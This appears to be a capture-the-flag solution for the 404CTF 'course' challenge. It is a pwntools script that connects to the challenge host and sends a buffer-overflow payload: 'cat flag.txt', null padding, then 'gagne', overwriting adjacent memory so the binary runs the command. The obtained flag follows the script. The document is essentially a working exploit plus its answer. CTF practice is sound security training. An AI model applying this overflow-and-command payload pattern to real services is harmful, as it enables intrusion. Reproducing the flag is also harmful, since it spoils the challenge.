```py
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./course')

io = remote("challenges.404ctf.fr", 31958)

io.recvuntil("pseudo :")

payload = b"cat flag.txt" + b"\x00"*94 + b"gagne\x00"

io.sendline(payload)

print(io.clean())
```

**404CTF{0v3rfl0w}**
